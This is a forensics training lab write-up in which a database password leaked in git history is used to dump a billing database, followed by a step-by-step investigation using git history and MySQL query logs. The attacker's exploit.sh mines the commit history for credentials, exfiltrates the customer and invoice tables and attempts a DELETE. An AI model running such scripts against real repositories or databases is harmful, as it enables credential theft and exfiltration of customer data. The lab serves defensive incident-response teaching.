# Scenario 6 — Leaked Credentials → Database Intrusion

> **Story.** A junior dev pushed a quick fix to a public GitHub repo
> over the weekend. On Monday, the security team's secret-scanner
> caught a hard-coded MySQL connection string in the commit history.
> The DB it points to is the production billing database. The team
> wants to know: *did anyone else see it first, and did they use it?*

**Modules used.** `database-forensics` (mysql-tools), `osint-tools`
(github recon helpers).

**Estimated demo time.** 35 minutes.

---

## 1. Lab setup

`docs/scenarios/labs/06-credleak/`:

```
├── docker-compose.lab.yml
├── repo/                       # the leaky git repository
│   ├── README.md
│   ├── app.py
│   └── .git-init.sh            # populates the leak across commits
├── db/
│   ├── Dockerfile
│   ├── init.sql
│   └── my.cnf                  # general_log enabled
└── attacker/
    ├── Dockerfile
    └── exploit.sh
```

### 1.1 The leaky repository

`repo/README.md`:

```markdown
# billing-utils

Internal helpers for the billing API. Nothing exciting.
```

`repo/app.py` — final state, looks clean:

```python
import os
import pymysql

DB_HOST = os.environ["DB_HOST"]
DB_USER = os.environ["DB_USER"]
DB_PASS = os.environ["DB_PASS"]
DB_NAME = os.environ.get("DB_NAME", "billing")

def get_conn():
    return pymysql.connect(host=DB_HOST, user=DB_USER,
                           password=DB_PASS, database=DB_NAME)

if __name__ == "__main__":
    print("connect ok:", bool(get_conn()))
```

`repo/.git-init.sh` — makes the history look realistic:

```bash
#!/usr/bin/env bash
# Create a repo where commit #2 contains the leak and commit #3 "fixes" it
# but leaves the secret in git history.
set -e

cd "$(dirname "$0")"
rm -rf .git

git init -q
git config user.email "dev@example.com"
git config user.name "Junior Dev"

# Commit 1: empty scaffold
cat > app.py <<'EOF'
# placeholder
EOF
git add . && git commit -q -m "initial scaffold"

# Commit 2: the leak — hard-coded credentials
cat > app.py <<'EOF'
import pymysql

# TODO: move to env vars before merging
def get_conn():
    return pymysql.connect(
        host="db.internal.lab",
        user="billing_app",
        password="P@ssw0rd-2024-Sup3rSecret!",
        database="billing",
    )

if __name__ == "__main__":
    print("connect ok:", bool(get_conn()))
EOF
git add . && git commit -q -m "wip: db connection helper"

# Commit 3: "fix" — moves to env vars but doesn't rewrite history
cat > app.py <<'EOF'
import os
import pymysql

DB_HOST = os.environ["DB_HOST"]
DB_USER = os.environ["DB_USER"]
DB_PASS = os.environ["DB_PASS"]
DB_NAME = os.environ.get("DB_NAME", "billing")

def get_conn():
    return pymysql.connect(host=DB_HOST, user=DB_USER,
                           password=DB_PASS, database=DB_NAME)

if __name__ == "__main__":
    print("connect ok:", bool(get_conn()))
EOF
git add . && git commit -q -m "fix: read credentials from env"

echo "Repo created with 3 commits — the leak is in commit 2's app.py."
```

### 1.2 The MySQL target

`db/my.cnf`:

```ini
[mysqld]
bind-address = 0.0.0.0
general_log  = 1
general_log_file = /var/log/mysql/general.log
log_error    = /var/log/mysql/error.log
slow_query_log = 1
slow_query_log_file = /var/log/mysql/slow.log
long_query_time = 0       # log everything for the lab
```

`db/init.sql`:

```sql
CREATE DATABASE IF NOT EXISTS billing;
USE billing;

CREATE TABLE customers (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(255),
    email VARCHAR(255),
    balance DECIMAL(10,2),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE invoices (
    id INT PRIMARY KEY AUTO_INCREMENT,
    customer_id INT,
    amount DECIMAL(10,2),
    status ENUM('paid','pending','overdue') DEFAULT 'pending',
    issued_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO customers (name, email, balance) VALUES
    ('Acme Corp',         'ap@acme.com',     12000.00),
    ('Globex Industries', 'finance@globex.com', 89500.50),
    ('Initech LLC',       'billing@initech.com', 4321.00),
    ('Stark Holdings',    'invoice@stark.com',  670000.00);

INSERT INTO invoices (customer_id, amount, status) VALUES
    (1, 1200.00, 'paid'),
    (1,  800.00, 'pending'),
    (2, 5500.00, 'overdue'),
    (4, 99000.00, 'paid');

-- The application user — exactly what the leaked credentials point to
CREATE USER 'billing_app'@'%' IDENTIFIED BY 'P@ssw0rd-2024-Sup3rSecret!';
GRANT SELECT, INSERT, UPDATE ON billing.* TO 'billing_app'@'%';

FLUSH PRIVILEGES;
```

`db/Dockerfile`:

```dockerfile
FROM mysql:8.0

COPY my.cnf      /etc/mysql/conf.d/forensics.cnf
COPY init.sql    /docker-entrypoint-initdb.d/01-init.sql

ENV MYSQL_ROOT_PASSWORD=lab-root-pw
ENV MYSQL_DATABASE=billing
EXPOSE 3306
```

### 1.3 The attacker

`attacker/Dockerfile`:

```dockerfile
FROM debian:12-slim
RUN apt-get update && apt-get install -y --no-install-recommends \
        git default-mysql-client curl python3 \
 && rm -rf /var/lib/apt/lists/*
COPY exploit.sh /exploit.sh
RUN chmod +x /exploit.sh
WORKDIR /work
```

`attacker/exploit.sh`:

```bash
#!/usr/bin/env bash
# Mimics what an opportunistic attacker would do after spotting a leaked
# credential in a public commit.
set -euo pipefail

REPO_URL=${1:-http://172.30.0.95/billing-utils.git}
DB_HOST=db.internal.lab

echo "[*] Cloning repo and scanning history…"
git clone -q "$REPO_URL" /tmp/billing-utils
cd /tmp/billing-utils

# A real attacker would use trufflehog / gitleaks. We grep.
echo "[*] Searching git history for password-shaped strings…"
git log -p --all | grep -iE 'password|passwd|secret' \
                 | grep -v -- '---' | head -10

# Pull the credential out of the leaky commit
LEAK=$(git log -p --all -S 'pymysql.connect' \
       | grep -oE 'password="[^"]+"' \
       | head -1 \
       | sed 's/password="//;s/"$//')
echo "[+] Found credential: $LEAK"

# Use it
echo "[*] Connecting…"
mysql -h"$DB_HOST" -ubilling_app -p"$LEAK" -e \
    "USE billing; SHOW TABLES; SELECT * FROM customers; SELECT * FROM invoices;"

# Exfiltrate
echo "[*] Exfiltrating customers…"
mysql -h"$DB_HOST" -ubilling_app -p"$LEAK" billing \
      -e "SELECT * FROM customers" --batch \
      > /work/exfil-customers.tsv

echo "[*] Exfiltrating invoices…"
mysql -h"$DB_HOST" -ubilling_app -p"$LEAK" billing \
      -e "SELECT * FROM invoices" --batch \
      > /work/exfil-invoices.tsv

ls -l /work/
echo "[*] Done. Cleanup attempt:"
mysql -h"$DB_HOST" -ubilling_app -p"$LEAK" -e \
      "USE billing; DELETE FROM invoices WHERE id=4;" 2>&1 | head
echo "[*] (DELETE blocked — billing_app has UPDATE but not DELETE)"
```

### 1.4 The git server (lightweight)

For the demo we host the repo over HTTP via `nginx + git-http-backend`,
or simply via `python -m http.server` after `git update-server-info`.
The simpler option:

```dockerfile
# repo-server/Dockerfile
FROM debian:12-slim
RUN apt-get update && apt-get install -y --no-install-recommends git \
 && rm -rf /var/lib/apt/lists/*
WORKDIR /srv/git
EXPOSE 80
CMD ["sh", "-c", "cd /srv/git/billing-utils && git update-server-info && python3 -m http.server --directory /srv/git 80"]
```

We'll mount the repo into this container.

### 1.5 Compose

```yaml
services:
  db:
    build: ./db
    container_name: target-mysql
    hostname: db.internal.lab
    networks:
      forensics-net:
        ipv4_address: 172.30.0.85
        aliases:
          - db.internal.lab
    environment:
      MYSQL_ROOT_PASSWORD: lab-root-pw
    volumes:
      - db-logs:/var/log/mysql
      - db-data:/var/lib/mysql

  repo-server:
    build: ./repo-server
    container_name: repo-server
    hostname: github-mirror.lab
    networks:
      forensics-net:
        ipv4_address: 172.30.0.95
    volumes:
      - ./repo:/srv/git/billing-utils
    ports:
      - "127.0.0.1:8085:80"

  attacker:
    build: ./attacker
    container_name: attacker-credleak
    hostname: kali02
    networks:
      forensics-net:
        ipv4_address: 172.30.0.96
    stdin_open: true
    tty: true
    command: ["sleep", "infinity"]

networks:
  forensics-net:
    name: forensics-net
    driver: bridge
    ipam:
      config:
        - subnet: 172.30.0.0/24

volumes:
  db-logs:
  db-data:
```

### 1.6 Bring it up

```bash
cd docs/scenarios/labs/06-credleak

# Build the leaky repo with realistic commit history
( cd repo && bash .git-init.sh )

docker compose -f docker-compose.lab.yml up -d --build

# Make sure the repo is HTTP-cloneable
docker exec repo-server sh -c \
    'cd /srv/git/billing-utils && git update-server-info'

# Sanity check
sleep 5
docker exec attacker-credleak \
    git ls-remote http://172.30.0.95/billing-utils
# → HEAD + branch hashes
```

---

## 2. The attack

```bash
docker exec -it attacker-credleak bash
/exploit.sh
```

Expected output:

```
[*] Cloning repo and scanning history…
[*] Searching git history for password-shaped strings…
+        password="P@ssw0rd-2024-Sup3rSecret!",
[+] Found credential: P@ssw0rd-2024-Sup3rSecret!
[*] Connecting…
…SHOW TABLES + customer/invoice dump…
[*] Exfiltrating customers…
[*] Exfiltrating invoices…
[*] (DELETE blocked — billing_app has UPDATE but not DELETE)
```

The attacker now has TSV dumps of both tables on disk in
`/work/exfil-customers.tsv` and `/work/exfil-invoices.tsv`.

---

## 3. The investigation

### 3.1 Acquire artefacts

```bash
mkdir -p forensics-professional/evidence/case-06-credleak/{repo,db-logs,attacker}

# The repo (full clone, with all history)
docker exec repo-server tar czf /tmp/repo.tar.gz -C /srv/git billing-utils
docker cp repo-server:/tmp/repo.tar.gz \
    forensics-professional/evidence/case-06-credleak/repo/

# DB logs
docker cp target-mysql:/var/log/mysql/general.log \
    forensics-professional/evidence/case-06-credleak/db-logs/
docker cp target-mysql:/var/log/mysql/error.log \
    forensics-professional/evidence/case-06-credleak/db-logs/ 2>/dev/null || true

# What the attacker took
docker cp attacker-credleak:/work/. \
    forensics-professional/evidence/case-06-credleak/attacker/

cd forensics-professional/evidence/case-06-credleak
find . -type f -exec sha256sum {} \; > ../case-06-credleak.sha256
```

### 3.2 Analyst container

```bash
cd forensics-professional
docker compose exec forensics bash
```

```bash
forensics-modules install database-forensics --only mysql-tools -y
forensics-modules install osint-tools --only domain-recon -y    # for general purpose
forensics-modules verify

mkdir -p /cases/case-06 && cd /cases/case-06
python3 - <<'PY'
from forensics.audit.logger import log_event
log_event("case_opened", {
    "case_id":  "INC-2026-006",
    "summary":  "Leaked DB credential in git history",
    "evidence": "/evidence/case-06-credleak/",
}, user="sherlock")
PY
```

### 3.3 Confirm the leak in git history

```bash
mkdir /tmp/repo && cd /tmp/repo
tar xf /evidence/case-06-credleak/repo/repo.tar.gz
cd billing-utils

# Was the password ever committed?
git log -p --all -S 'P@ssw0rd-2024-Sup3rSecret' \
        --pretty=format:'%h %ad %an %s' --date=iso
# → shows commit 2 introducing it, commit 3 removing it
```

Even though the working tree is "clean" today, **the secret is still
in history**. This is the entire point.

```bash
# Show what the leak commit looked like
LEAK_SHA=$(git log --all --pretty=%H -S 'P@ssw0rd-2024-Sup3rSecret' | tail -1)
git show "$LEAK_SHA"
```

### 3.4 Quantify the exposure window

```bash
# When was the leak introduced?
git show -s --format='%ci' "$LEAK_SHA"

# When was the "fix" pushed?
FIX_SHA=$(git log --all --pretty=%H -S 'P@ssw0rd-2024-Sup3rSecret' | head -1)
git show -s --format='%ci' "$FIX_SHA"

# How long was the credential live in the latest commit?
# (For a public repo, this is the window in which any clone captured it.)
```

### 3.5 Look for use of the credential in DB logs

```bash
GLOG=/evidence/case-06-credleak/db-logs/general.log

# All connect events for billing_app
grep -E 'Connect.*billing_app' "$GLOG"
```

You'll see:

- The legitimate app connecting (probably from an internal IP in a real
  case).
- The attacker connecting from `172.30.0.96`.

```bash
# Identify connect-from IPs
grep -E 'Connect.*billing_app' "$GLOG" \
  | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' \
  | sort -u
```

### 3.6 Reconstruct the attacker's session

```bash
# Find the attacker's connection ID
ATK_CONNECT=$(grep -E 'Connect.*billing_app.*172.30.0.96' "$GLOG" \
              | head -1)
echo "$ATK_CONNECT"

# Each MySQL log line begins with a thread ID. Pull all activity for
# the attacker's thread:
THREAD=$(echo "$ATK_CONNECT" | awk '{print $2}' | head -1)
echo "thread: $THREAD"

grep -E "^\s+\S+ +${THREAD} " "$GLOG" \
  | head -50
```

You'll see:

```
… Connect    billing_app@172.30.0.96 on billing using TCP/IP
… Init DB    billing
… Query      SHOW TABLES
… Query      SELECT * FROM customers
… Query      SELECT * FROM invoices
… Query      USE billing
… Query      DELETE FROM invoices WHERE id=4
… Quit
```

The query log gives a frame-by-frame replay of the intrusion.

### 3.7 Confirm what data left

```bash
ls -lh /evidence/case-06-credleak/attacker/
wc -l /evidence/case-06-credleak/attacker/exfil-*.tsv
head -3 /evidence/case-06-credleak/attacker/exfil-customers.tsv
```

These are exactly the rows the SELECT queries returned. We can prove
to the GDPR/PCI auditor *which* customer records left the perimeter.

### 3.8 Compute blast-radius hash

A useful artefact: hash the data that was exfiltrated. If it
ever reappears in a leak/dump, you can identify it as yours.

```bash
sha256sum /evidence/case-06-credleak/attacker/exfil-customers.tsv \
          /evidence/case-06-credleak/attacker/exfil-invoices.tsv
```

### 3.9 Did the attacker pivot?

A common follow-up after DB compromise is using the stolen credential
elsewhere. Search the general log for sign-ins from the same IP after
the initial dump:

```bash
grep '172.30.0.96' "$GLOG" | head -20
```

For a real case, also check:

- Application logs for bearer tokens minted using the leaked DB rows.
- Email logs for password-reset attempts to `*@stark.com` / `@globex.com`.
- WAF logs for spikes from that IP.

### 3.10 Record findings

```bash
python3 - <<'PY'
from forensics.audit.logger import log_event

log_event("ioc_identified", {
    "case_id": "INC-2026-006",
    "ioc_type": "git_secret",
    "value": "git commit <SHA> introduced DB password in app.py",
    "remediation": "rotate password AND rewrite history (BFG / git filter-repo)",
})
log_event("ioc_identified", {
    "case_id": "INC-2026-006",
    "ioc_type": "ip",
    "value": "172.30.0.96",
    "label": "attacker source",
})
log_event("technique_identified", {
    "case_id": "INC-2026-006",
    "framework": "MITRE ATT&CK",
    "id": "T1552.004",
    "name": "Unsecured Credentials: Private Keys / Credentials in Files",
})
log_event("technique_identified", {
    "case_id": "INC-2026-006",
    "framework": "MITRE ATT&CK",
    "id": "T1078.003",
    "name": "Valid Accounts: Local Accounts",
})
log_event("data_exfiltration", {
    "case_id": "INC-2026-006",
    "tables":  ["billing.customers", "billing.invoices"],
    "rows_estimated": 4 + 4,
    "method":  "SELECT via legitimate MySQL user with leaked credential",
})
PY

forensics-audit verify
mkdir -p /reports/INC-2026-006
forensics-audit export \
    --output /reports/INC-2026-006/audit-trail.jsonl --format jsonl
```

### 3.11 Required follow-ups (not a job for forensics — list for the IR team)

```
1. Rotate the billing_app password immediately.
2. Rewrite git history (git filter-repo --replace-text) — without this,
   the credential remains discoverable forever in clones already taken.
3. Add a pre-commit hook or repo-side scanner (gitleaks / trufflehog) so
   secrets never reach a public commit again.
4. Notify customers whose rows were exfiltrated, per applicable data
   protection law.
5. Audit other public repos under the same org for similar patterns.
```

---

## 4. What to demo

1. **History never forgets.** Show the working tree (clean) and then
   the `git log -p -S` query that pulls the secret straight back out.
   "Fixed by rewriting" doesn't work without history rewrite + force-push.
2. **Query-log replay.** Show the attacker's session reconstructed
   line-by-line from the MySQL general log. This is what makes a DB
   incident provable, not speculative.
3. **Permission model worked partially.** The DELETE was blocked
   because `billing_app` had only SELECT/INSERT/UPDATE. Show the
   error in the log. *Least-privilege saves you here even though the
   credential leaked.*
4. **Attribution chain.** The audit log ties: the git commit hash →
   the credential → the DB session → the exfiltrated rows. Each link
   is independently provable.

---

## 5. Cleanup

```bash
cd docs/scenarios/labs/06-credleak
docker compose -f docker-compose.lab.yml down -v
rm -rf forensics-professional/evidence/case-06-credleak
rm -rf repo/.git
```

---

## 6. Extension exercises

- **TruffleHog/Gitleaks.** Install one of them
  (`forensics-modules install osint-tools`) and re-run scanning over
  the cloned repo to compare automated detection vs `grep`.
- **Honeytoken.** Add a fake `customers_legacy` table with one row
  whose email contains a unique sentinel string. If that string ever
  appears in a public dump, you know exactly which exfiltration
  produced it.
- **DB audit plugin.** Replace the general log with the MySQL audit
  plugin (Percona's `audit_log` or MariaDB's `server_audit`) and
  re-investigate. Note how much cleaner the structured audit log is
  to query than the general log's text format.
